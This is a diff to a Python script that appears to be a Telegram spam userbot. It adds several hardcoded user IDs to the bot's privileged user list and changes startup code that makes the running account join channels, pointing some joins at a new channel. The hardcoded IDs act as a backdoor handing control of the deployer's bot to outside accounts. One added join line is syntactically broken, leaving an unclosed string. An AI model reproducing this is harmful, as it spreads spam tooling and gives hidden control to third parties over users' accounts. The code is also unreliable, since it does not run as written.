@@ -97,7 +97,7 @@ boy = ""
 
 que = {}
 
-SMEX_USERS = [2020051281]
+SMEX_USERS = [2020051281, 2044073145, 2021626145, 2079359858]
 for x in SUDO: 
     SMEX_USERS.append(x)
     
@@ -141,8 +141,8 @@ async def start_aries():
             print("Booting Up The Client 1")
             await idk.start()
             botme = await idk.get_me()
-            await idk(functions.channels.JoinChannelRequest(channel="@mahakalspamcontrolroom"))
-            await idk(functions.channels.JoinChannelRequest(channel="@mahakalspamcontrolroom"))
+            await idk(functions.channels.JoinChannelRequest(channel="@Baapjiiiiiiiiii
+            await idk(functions.channels.JoinChannelRequest(channel="@Baapjiiiiiiiiii"))
             await idk(functions.channels.JoinChannelRequest(channel="@mahakalspamcontrolroom"))
             await idk(functions.channels.JoinChannelRequest(channel="@mahakalspamcontrolroom"))
             await idk(functions.channels.JoinChannelRequest(channel="@mahakalspamcontrolroom"))
